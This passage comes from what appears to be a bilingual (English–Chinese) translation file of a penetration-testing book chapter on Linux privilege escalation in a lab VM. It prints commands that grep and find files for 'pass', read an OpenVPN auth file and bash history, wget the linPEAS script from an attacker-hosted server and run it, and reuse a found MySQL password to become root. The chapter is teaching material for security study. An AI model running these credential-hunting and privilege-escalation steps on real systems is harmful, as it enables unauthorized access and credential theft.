    **/etc** directory, as highlighted in the following screenshot:'
  id: totrans-107
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 此命令将把结果限制在**/etc**目录中找到的配置文件，如下图所示：
- en: '![Figure 11.9 – Customized grep search results'
  id: totrans-108
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 11.9 – 定制的 grep 搜索结果'
- en: '](Images/B17389_11_009.jpg)'
  id: totrans-109
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_009.jpg)'
- en: Figure 11.9 – Customized grep search results
  id: totrans-110
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.9 – 定制的 grep 搜索结果
- en: In this case, we weren't able to identify any useful credentials, so we can
    turn our attention to the **user** home directory.
  id: totrans-111
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这种情况下，我们未能识别出任何有用的凭证，因此我们可以将注意力转向**用户**的主目录。
- en: 'We can customize the search keyword in order to ensure that we do not miss
    any matches for the keyword by utilizing the **pass** keyword instead of **password**.
    This can be done by running the following command:'
  id: totrans-112
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以定制搜索关键字，确保通过使用**pass**关键字而不是**password**，不会错过任何匹配项。这可以通过运行以下命令来完成：
- en: '**grep --color=auto -rnw ''/home/user'' -ie "PASS" --color=always 2> /dev/null**'
  id: totrans-113
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**grep --color=auto -rnw ''/home/user'' -ie "PASS" --color=always 2> /dev/null**'
- en: 'This command will output a list of all files in the **user** account home directory
    with the **pass** keyword, as highlighted in the following screenshot:'
  id: totrans-114
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 此命令将输出**用户**帐户主目录中包含**pass**关键字的所有文件列表，如下图所示：
- en: '![Figure 11.10 – Customized grep search results'
  id: totrans-115
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 11.10 – 定制的 grep 搜索结果'
- en: '](Images/B17389_11_010.jpg)'
  id: totrans-116
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_010.jpg)'
- en: Figure 11.10 – Customized grep search results
  id: totrans-117
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.10 – 定制的 grep 搜索结果
- en: 'In this case, we are able to identify an OpenVPN configuration file in the
    **user** account home directory that contains the location of the OpenVPN credentials.
    We can display the contents of the file highlighted in the preceding screenshot
    by running the following command:'
  id: totrans-118
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这种情况下，我们能够在**用户**帐户主目录中识别到一个包含 OpenVPN 凭证位置的 OpenVPN 配置文件。我们可以通过运行以下命令显示前面截图中高亮显示的文件内容：
- en: '**cat /etc/openvpn/auth.txt**'
  id: totrans-119
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**cat /etc/openvpn/auth.txt**'
- en: 'The output of this command is shown here:'
  id: totrans-120
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 此命令的输出如下所示：
- en: '![Figure 11.11 – OpenVPN credentials'
  id: totrans-121
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图11.11 – OpenVPN凭据'
- en: '](Images/B17389_11_011.jpg)'
  id: totrans-122
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_011.jpg)'
- en: Figure 11.11 – OpenVPN credentials
  id: totrans-123
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图11.11 – OpenVPN凭据
- en: Displaying the contents of the file reveals the credentials for the **user**
    account but does not reveal the credentials for any other account on the system,
    as highlighted in the preceding screenshot.
  id: totrans-124
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 显示文件内容时，我们可以看到**用户**帐户的凭据，但无法看到系统中任何其他帐户的凭据，如前面的截图所示。
- en: If we did not know the credentials for the **user** account beforehand, this
    would be useful information as we would have obtained the password for the **user**
    account without cracking the password hash for this account.
  id: totrans-125
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果我们事先不知道**用户**帐户的凭据，这将是有用的信息，因为我们将无需破解该帐户的密码哈希便能获取**用户**帐户的密码。
- en: 'You can also utilize the **find** utility in conjunction with the **grep**
    utility in order to fine-tune your searches based on the configuration of your
    target. This can be done by running the following command:'
  id: totrans-126
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 你还可以结合使用**find**工具和**grep**工具，根据目标的配置进一步优化搜索。这可以通过运行以下命令来完成：
- en: '**find /etc -type f -exec grep -i -I "PASS" {} /dev/null \;**'
  id: totrans-127
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**find /etc -type f -exec grep -i -I "PASS" {} /dev/null \;**'
- en: This command will output a list of files in the **/etc** directory that contain
    the **pass** keyword.
  id: totrans-128
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这个命令将输出一个包含**pass**关键字的**/etc**目录下的文件列表。
- en: 'In this case, we are not able to find any new files that contain credentials
    that we can use, as highlighted in the following screenshot:'
  id: totrans-129
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这种情况下，我们无法找到任何包含我们可以使用的凭据的新文件，如以下截图所示：
- en: '![Figure 11.12 – find search results'
  id: totrans-130
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图11.12 – 查找搜索结果'
- en: '](Images/B17389_11_012.jpg)'
  id: totrans-131
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_012.jpg)'
- en: Figure 11.12 – find search results
  id: totrans-132
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图11.12 – 查找搜索结果
- en: 'We can also search for files that contain the **pass** keyword in the **user**
    account home directory by running the following command:'
  id: totrans-133
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们还可以通过运行以下命令，搜索包含**pass**关键字的**用户**帐户主目录中的文件：
- en: '**find /home/user -type f -exec grep -i -I "PASS" {} /dev/null \;**'
  id: totrans-134
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**find /home/user -type f -exec grep -i -I "PASS" {} /dev/null \;**'
- en: 'The output is shown here:'
  id: totrans-135
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 输出结果如图所示：
- en: '![Figure 11.13 – Custom find search results'
  id: totrans-136
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图11.13 – 自定义查找搜索结果'
- en: '](Images/B17389_11_013.png)Figure 11.13 – Custom find search results'
  id: totrans-137
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_013.png)图11.13 – 自定义查找搜索结果'
- en: In this case, we are able to identify an **Internet Relay Chat** (**IRC**) client
    configuration file that contains the **user** account IRC credentials; however,
    we are not able to locate any other user or application credentials that can be
    used for privilege escalation.
  id: totrans-138
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这种情况下，我们能够识别出一个包含**用户**帐户IRC凭据的**互联网中继聊天**（**IRC**）客户端配置文件；然而，我们无法找到任何其他可以用于特权提升的用户或应用程序凭据。
- en: We can automate this process through the use of an automated enumeration script.
    In this case, we will utilize **Linux Privilege Escalation Awesome Script** (**linPEAS**)
    to automate the password mining process on our target.
  id: totrans-139
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过使用自动化枚举脚本来自动化这个过程。在这种情况下，我们将使用**Linux特权提升超级脚本**（**linPEAS**）来自动化目标上的密码挖掘过程。
- en: Note
  id: totrans-140
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 注意
- en: '**linPEAS** is a local Linux enumeration script that searches and scans for
    potential vulnerabilities and enumerates all important system information that
    can be used to stage a privilege escalation attack.'
  id: totrans-141
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**linPEAS**是一个本地Linux枚举脚本，用于搜索和扫描潜在的漏洞，并枚举所有可以用于进行特权提升攻击的重要系统信息。'
- en: 'The linPEAS binary can be downloaded from the GitHub repository here:'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: linPEAS二进制文件可以从GitHub仓库下载，链接如下：
- en: '[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: '[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)'
- en: 'Ensure you download the **linpeas** Bash script, as highlighted in the following
    screenshot:'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 确保你下载了**linpeas** Bash脚本，如以下截图所示：
- en: '![Figure 11.14 – linPEAS Bash script'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: '![图11.14 – linPEAS Bash脚本'
- en: '](Images/B17389_11_014.jpg)'
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_014.jpg)'
- en: Figure 11.14 – linPEAS Bash script
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 图11.14 – linPEAS Bash脚本
- en: After downloading the Bash script to our Kali VM, we need to transfer the **linpeas.sh**
    file to our target VM. This cannot be done automatically as we do not have a meterpreter
    session. As a result, we will need to make use of Linux-specific utilities to
    download the binary.
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 在将Bash脚本下载到我们的Kali虚拟机后，我们需要将**linpeas.sh**文件传输到目标虚拟机。这不能自动完成，因为我们没有meterpreter会话。因此，我们需要使用Linux特定的工具来下载该二进制文件。
- en: Transferring files
  id: totrans-149
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 文件传输
- en: 'In order to transfer the **linpeas.sh** file to our target, we will need to
    set up a web server on our Kali VM that will be used to host the file so that
    we can download it on the target system. This can be done by following the procedures
    outlined here:'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 为了将 **linpeas.sh** 文件传输到目标系统，我们需要在 Kali 虚拟机上设置一个 Web 服务器，用于托管该文件，以便我们可以在目标系统上下载它。可以按照此处概述的步骤进行操作：
- en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
    Python module to serve the binary file. This can be done by running the following
    command in the directory where the **linpeas.sh** binary is stored:'
  id: totrans-151
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了在 Kali 虚拟机上设置 Web 服务器，我们可以使用 **SimpleHTTPServer** Python 模块来提供二进制文件。这可以通过在存储
    **linpeas.sh** 二进制文件的目录中运行以下命令来完成：
- en: '**sudo python -m SimpleHTTPServer 80**'
  id: totrans-152
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo python -m SimpleHTTPServer 80**'
- en: Note
  id: totrans-153
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 注意
- en: '**SimpleHTTPServer** is a Python module for Python 2 and is also available
    for Python 3 under the name **http.server**.'
  id: totrans-154
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**SimpleHTTPServer** 是一个适用于 Python 2 的模块，也可以在 Python 3 中使用，名称为 **http.server**。'
- en: 'As highlighted in the following screenshot, the **SimpleHTTPServer** module
    will serve the files in the directory on the Kali VM **Internet Protocol** (**IP**)
    address on port **80**:'
  id: totrans-155
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，**SimpleHTTPServer** 模块将在 Kali 虚拟机的 **Internet Protocol** (**IP**) 地址的
    **80** 端口上提供该目录中的文件：
- en: '![Figure 11.15 – SimpleHTTPServer linPEAS'
  id: totrans-156
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 11.15 – SimpleHTTPServer linPEAS'
- en: '](Images/B17389_11_015.jpg)'
  id: totrans-157
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_015.jpg)'
- en: Figure 11.15 – SimpleHTTPServer linPEAS
  id: totrans-158
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.15 – SimpleHTTPServer linPEAS
- en: In order to download the **linpeas.sh** file on to the target system, we can
    utilize the **wget** utility. Before we can download the binary, however, we need
    to navigate to a directory where we have read and write permissions. In this case,
    we will navigate to the temporary directory, as illustrated in the following screenshot:![Figure
    11.16 – Linux temporary directory
  id: totrans-159
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了将 **linpeas.sh** 文件下载到目标系统，我们可以使用 **wget** 工具。然而，在下载二进制文件之前，我们需要导航到一个有读写权限的目录。在此，我们将导航到临时目录，如下截图所示：![图
    11.16 – Linux 临时目录
- en: '](Images/B17389_11_016.jpg)'
  id: totrans-160
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_016.jpg)'
- en: Figure 11.16 – Linux temporary directory
  id: totrans-161
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.16 – Linux 临时目录
- en: 'We can now use the **wget** utility to download the file from the Kali VM to
    our target system. This can be done by running the following command on the target
    system:'
  id: totrans-162
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们可以使用 **wget** 工具从 Kali 虚拟机下载文件到目标系统。这可以通过在目标系统上运行以下命令来完成：
- en: '**wget http://<KALI-VM-IP>/linpeas.sh**'
  id: totrans-163
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**wget http://<KALI-VM-IP>/linpeas.sh**'
- en: 'The output of this command is shown here:'
  id: totrans-164
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 此命令的输出如下所示：
- en: '![Figure 11.17 – Transferring the linPEAS script'
  id: totrans-165
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 11.17 – 转移 linPEAS 脚本'
- en: '](Images/B17389_11_017.jpg)'
  id: totrans-166
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_017.jpg)'
- en: Figure 11.17 – Transferring the linPEAS script
  id: totrans-167
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.17 – 转移 linPEAS 脚本
- en: As shown in the preceding screenshot, if the transfer is successful, the **linpeas.sh**
    file should be downloaded and saved with the name we specified.
  id: totrans-168
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如前面的截图所示，如果传输成功，**linpeas.sh** 文件应已下载并保存为我们指定的名称。
- en: 'We can now use the **linpeas.sh** script to automate the password mining process.
    This can be done by running the **linpeas.sh** script. However, before we do that,
    we need to ensure the script has executable permissions. This can be done by running
    the following command on the target:'
  id: totrans-169
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们可以使用 **linpeas.sh** 脚本来自动化密码挖掘过程。这可以通过运行 **linpeas.sh** 脚本来完成。然而，在此之前，我们需要确保脚本具有可执行权限。这可以通过在目标系统上运行以下命令来完成：
- en: '**chmod +x linpeas.sh**'
  id: totrans-170
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**chmod +x linpeas.sh**'
- en: 'We can now run the **linpeas.sh** script by running the following command on
    the target:'
  id: totrans-171
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们现在可以通过在目标系统上运行以下命令来运行 **linpeas.sh** 脚本：
- en: '**./linpeas.sh**'
  id: totrans-172
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**./linpeas.sh**'
- en: This command will enumerate and output all relevant system information pertinent
    to privilege escalation. In this case, we are only interested in the files that
    contain credentials.
  id: totrans-173
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 此命令将枚举并输出与特权提升相关的所有系统信息。在此，我们只对包含凭证的文件感兴趣。
- en: 'In this case, we are able to identify the IRC client credentials we found earlier
    with manual techniques, as highlighted in the following screenshot:'
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们能够通过手动技术识别我们之前找到的 IRC 客户端凭证，具体如下截图所示：
- en: '![Figure 11.18 – IRC client password'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.18 – IRC 客户端密码'
- en: '](Images/B17389_11_018.jpg)'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_018.jpg)'
- en: Figure 11.18 – IRC client password
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.18 – IRC 客户端密码
- en: 'We were also able to identify the OpenVPN user credentials, as highlighted
    in the following screenshot:'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还能够识别 OpenVPN 用户凭证，如下截图所示：
- en: '![Figure 11.19 – OpenVPN credentials'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.19 – OpenVPN 凭证'
- en: '](Images/B17389_11_019.jpg)'
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_019.jpg)'
- en: Figure 11.19 – OpenVPN credentials
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.19 – OpenVPN 凭证
- en: The **linpeas.sh** script does not reveal any other credentials or passwords
    stored locally on the system. As a result, we will have to narrow down our search
    to specific files that are likely to contain potentially useful information.
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: '**linpeas.sh**脚本没有显示系统本地存储的其他凭据或密码。因此，我们将不得不将搜索范围缩小到可能包含潜在有用信息的特定文件。'
- en: Our search for passwords and credentials has not been fruitful as we were not
    able to locate any credentials that would allow us to elevate our privileges further.
    However, we were only able to find the **user** account credentials.
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 我们对密码和凭据的搜索并没有取得成果，因为我们无法找到任何可以让我们进一步提升权限的凭据。然而，我们只能找到**user**账户的凭据。
- en: The next step in the process will involve searching for passwords in history
    files on the target system.
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 过程中的下一步将涉及在目标系统的历史文件中搜索密码。
- en: Searching for passwords in history files
  id: totrans-185
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在历史文件中搜索密码
- en: One of the advantages of running Linux is the extensive amount of logging that
    is afforded to a user. By default, Linux will automatically log all Bash commands
    entered on a system by a user unless specified otherwise. This is an advantage
    for system administrators as it provides a system of accountability whereby all
    user actions and commands are logged and can be analyzed historically; however,
    if not configured correctly, attackers can leverage this functionality to search
    for and identify important information such as credentials from various history
    files that log the commands entered by a user.
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 运行Linux的一个优势是用户可以获得大量的日志记录。默认情况下，Linux会自动记录用户在系统上输入的所有Bash命令，除非另有规定。这对系统管理员来说是一个优势，因为它提供了一个问责制系统，用户的所有操作和命令都被记录下来，并可以进行历史分析；然而，如果配置不正确，攻击者可以利用这个功能来搜索并识别来自用户输入命令的各种历史文件中的重要信息，如凭据。
- en: Companies and organizations mitigate this inherent configuration vulnerability
    by disabling the user command history from being logged. Alternatively, they can
    also enforce the deletion of these logs once a user has completed a session. However,
    in many cases, users on a Linux system may forget to clear their history, and
    as a result, attackers can sift through the user's history with the objective
    of locating potentially useful information.
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 公司和组织通过禁用用户命令历史记录来减轻这种固有的配置漏洞。或者，他们也可以在用户完成会话后强制删除这些日志。然而，在许多情况下，Linux系统上的用户可能会忘记清除他们的历史记录，因此，攻击者可以筛选用户的历史记录，以寻找潜在有用信息。
- en: 'The steps for searching and identifying locally stored credentials through
    various techniques are as follows:'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 通过各种技术搜索和识别本地存储的凭据的步骤如下：
- en: 'The first step in this process involves analyzing the **user** account Bash
    history file. The **bash_history** file logs all commands input by a user in a
    Bash session and is located by default in the user''s home directory. We can utilize
    the **cat** utility in conjunction with the **grep** utility to display the contents
    of the file and limit the output to only display commands that match a keyword.
    This can be done by running the following command:'
  id: totrans-189
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这个过程的第一步涉及分析**user**账户的Bash历史文件。**bash_history**文件记录了用户在Bash会话中输入的所有命令，并且默认位于用户的主目录中。我们可以利用**cat**实用程序与**grep**实用程序结合使用来显示文件的内容，并将输出限制为仅显示与关键字匹配的命令。可以通过运行以下命令来实现：
- en: '**cat /home/user/.bash_history | grep "pass"**'
  id: totrans-190
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**cat /home/user/.bash_history | grep "pass"**'
- en: 'This command will output a list of commands entered by a user in the past that
    contain the **pass** keyword, with the aim of identifying any credentials that
    may have been entered, as illustrated in the following screenshot:'
  id: totrans-191
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这个命令将输出用户过去输入的包含**pass**关键字的命令列表，旨在识别可能已经输入的任何凭据，如下截图所示：
- en: '![Figure 11.20 – Analyzing Bash history'
  id: totrans-192
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图11.20 – 分析Bash历史'
- en: '](Images/B17389_11_020.jpg)'
  id: totrans-193
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_020.jpg)'
- en: Figure 11.20 – Analyzing Bash history
  id: totrans-194
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图11.20 – 分析Bash历史
- en: As highlighted in the preceding screenshot, we are able to identify an authentication
    command to a local MySQL server that contains the username and password specified
    in cleartext.
  id: totrans-195
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如前面的截图所示，我们能够识别一个包含明文指定用户名和密码的本地MySQL服务器的认证命令。
- en: Note
  id: totrans-196
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 注意
- en: The **bash_history** file is used to store the command history of a particular
    user. The **bash_history** file can be configured in the **.bashrc** configuration
    file that is stored in the home directory of a user.
  id: totrans-197
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**bash_history** 文件用于存储特定用户的命令历史记录。**bash_history** 文件可以在用户的主目录中的 **.bashrc**
    配置文件中进行配置。'
- en: We can utilize these credentials for authentication with the MySQL server; however,
    the server doesn't seem to be running a MySQL server at this point in its operation.
    However, we can also utilize these credentials to authenticate to the root account
    in the event of password reuse.
  id: totrans-198
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以利用这些凭据进行 MySQL 服务器身份验证；然而，服务器在此时似乎没有运行 MySQL 服务。然而，如果发生密码重用，我们也可以使用这些凭据对
    root 账户进行身份验证。
- en: 'This can be done by switching to the **root** user from our current user and
    specifying the credentials we identified in the preceding screenshot, as follows:'
  id: totrans-199
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这可以通过从当前用户切换到 **root** 用户，并指定我们在前述截图中识别的凭据来完成，如下所示：
- en: '**su root**'
  id: totrans-200
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**su root**'
- en: 'As highlighted in the following screenshot, authentication with the MySQL credentials
    was successful, and we have successfully elevated our privileges to the highest
    level on the target system:'
  id: totrans-201
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，使用 MySQL 凭据进行身份验证成功，我们已经成功地将我们的权限提升到了目标系统的最高级别：
- en: '![Figure 11.21 – Successful privilege escalation'
  id: totrans-202
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 11.21 – 成功的权限提升'
- en: '](Images/B17389_11_021.jpg)'
  id: totrans-203
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_021.jpg)'
- en: Figure 11.21 – Successful privilege escalation
  id: totrans-204
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.21 – 成功的权限提升
- en: 'Alternatively, we can also use the **history** command on the target system
    to output the entire history of commands that have been previously entered by
    a user. This can be done by running the following command:'
  id: totrans-205
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 或者，我们还可以使用 **history** 命令在目标系统上输出用户之前输入的所有命令历史记录。可以通过运行以下命令实现：
- en: '**history**'
  id: totrans-206
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**history**'
- en: 'As highlighted in the following screenshot, we are able to identify an authentication
    attempt to a MySQL server with the credentials specified in cleartext. We are
    also able to identify potentially interesting files that could contain information
    that could be useful in elevating our privileges on the target system, as shown
    in the following screenshot:'
  id: totrans-207
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，我们能够识别出使用明文指定的凭据对 MySQL 服务器的身份验证尝试。我们还能够识别出可能包含有助于提升我们在目标系统上权限的有用信息的潜在文件，如下图所示：
- en: '![Figure 11.22 – Analyzing command history'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.22 – 分析命令历史记录'
- en: '](Images/B17389_11_022.jpg)'
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_022.jpg)'
- en: Figure 11.22 – Analyzing command history
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.22 – 分析命令历史记录
- en: In this case, we can utilize the MySQL credentials to elevate our privileges
    to the highest level as the root user, as we have done previously.
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们可以利用 MySQL 凭据将我们的权限提升到最高级别，作为 root 用户，就像我们之前所做的那样。
- en: We have been able to successfully elevate our privileges by searching for and
    identifying locally stored credentials through various techniques.
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 通过多种技术搜索并识别本地存储的凭据，我们已经成功地提升了我们的权限。
- en: Summary
  id: totrans-213
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we got started by taking a look at how to extract application
    passwords from memory with the GDB. We then took an in-depth look at how to search
    for and identify passwords in configuration files, both manually and automatically.
    We finally ended the chapter by taking a look at how to locate passwords from
    the **bash_history** file of a particular user.
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: 本章开始时，我们了解了如何通过 GDB 从内存中提取应用程序密码。然后，我们深入研究了如何手动和自动地搜索和识别配置文件中的密码。最后，我们通过查看特定用户的
    **bash_history** 文件，了解了如何查找密码。
- en: Now that we have learned how to elevate our privileges by finding locally stored
    passwords on Linux systems, we can begin exploring other Linux privilege escalation
    vectors.
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经学会了如何通过查找 Linux 系统中本地存储的密码来提升权限，我们可以开始探索其他 Linux 权限提升途径。
- en: In the next chapter, we will explore the process of elevating our privileges
    through misconfigured scheduled tasks.
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将探讨通过配置错误的计划任务提升权限的过程。
